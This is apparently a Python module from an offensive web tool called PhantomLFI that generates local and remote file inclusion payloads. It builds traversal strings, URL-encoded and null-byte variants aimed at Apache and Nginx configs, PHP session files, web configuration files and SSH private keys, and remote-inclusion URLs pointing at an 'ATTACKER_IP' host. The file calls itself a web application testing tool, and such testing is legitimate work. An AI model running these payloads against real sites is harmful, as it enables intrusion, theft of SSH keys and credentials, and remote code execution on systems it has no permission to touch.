"""
Central payload generator for PhantomLFI.
Linux-focused for web application testing.
Done by D4rk0ps
"""

from core.traversal import generate_traversal_payloads
from core.wrappers import generate_all_wrapper_payloads
from core.rfi import generate_all_rfi_payloads
from core.utils import sanitize_url
from config.default_targets import (
    LINUX_APACHE_PATHS,
    LINUX_NGINX_PATHS,
    LINUX_PHP_SESSION_PATHS,
    LINUX_SSH_KEYS,
    LINUX_WEB_CONFIG,
)
from core.encoders import url_encode, null_byte_suffix


class PayloadGenerator:
    """Orchestrates LFI and RFI payload generation."""

    def __init__(
        self,
        base_url: str,
        depth: int = 6,
        attacker_host: str = "ATTACKER_IP",
    ):
        self.base_url = sanitize_url(base_url)
        self.depth = depth
        self.attacker_host = attacker_host

    def _prepend_url(self, payloads: dict) -> dict:
        """Prepend the base URL to every payload."""
        return {
            category: [f"{self.base_url}{p}" for p in plist]
            for category, plist in payloads.items()
        }

    def generate_lfi(self) -> dict:
        """Generate all LFI payloads."""
        all_payloads = {}

        # Directory traversal
        all_payloads.update(generate_traversal_payloads(depth=self.depth))

        # PHP wrappers
        all_payloads.update(generate_all_wrapper_payloads())

        # Log, session, config paths
        all_payloads.update(self._generate_log_session_payloads())
        all_payloads.update(self._generate_config_payloads())

        return self._prepend_url(all_payloads)

    def generate_rfi(self) -> dict:
        """Generate all RFI payloads."""
        return self._prepend_url(generate_all_rfi_payloads(self.attacker_host))

    def _generate_log_session_payloads(self) -> dict:
        """Generate payloads targeting log files and PHP sessions."""
        results = {}

        # Apache
        apache_payloads = []
        for path in LINUX_APACHE_PATHS:
            clean = path.lstrip("/")
            apache_payloads.extend([
                path, url_encode(path), null_byte_suffix(path),
            ])
            for d in [3, 5, self.depth]:
                apache_payloads.append(f"{'../' * d}{clean}")
        results["Apache Config Paths"] = list(dict.fromkeys(apache_payloads))

        # Nginx
        nginx_payloads = []
        for path in LINUX_NGINX_PATHS:
            clean = path.lstrip("/")
            nginx_payloads.extend([
                path, url_encode(path), null_byte_suffix(path),
            ])
            for d in [3, 5, self.depth]:
                nginx_payloads.append(f"{'../' * d}{clean}")
        results["Nginx Config Paths"] = list(dict.fromkeys(nginx_payloads))

        # PHP sessions
        session_payloads = []
        for path in LINUX_PHP_SESSION_PATHS:
            clean = path.lstrip("/")
            session_payloads.extend([path, url_encode(path)])
            for d in [3, 5, self.depth]:
                session_payloads.append(f"{'../' * d}{clean}")
        results["PHP Session Paths"] = list(dict.fromkeys(session_payloads))

        return results

    def _generate_config_payloads(self) -> dict:
        """Generate payloads targeting web configs and SSH keys."""
        results = {}

        config_payloads = []
        for path in LINUX_WEB_CONFIG:
            clean = path.lstrip("/")
            config_payloads.extend([
                path, url_encode(path), null_byte_suffix(path),
            ])
            for d in [3, 5, self.depth]:
                config_payloads.append(f"{'../' * d}{clean}")
        results["Web Config Files"] = list(dict.fromkeys(config_payloads))

        ssh_payloads = []
        for path in LINUX_SSH_KEYS:
            clean = path.lstrip("/")
            ssh_payloads.extend([
                path, url_encode(path), null_byte_suffix(path),
            ])
            for d in [3, 5, self.depth]:
                ssh_payloads.append(f"{'../' * d}{clean}")
        results["SSH Key Paths"] = list(dict.fromkeys(ssh_payloads))

        return results
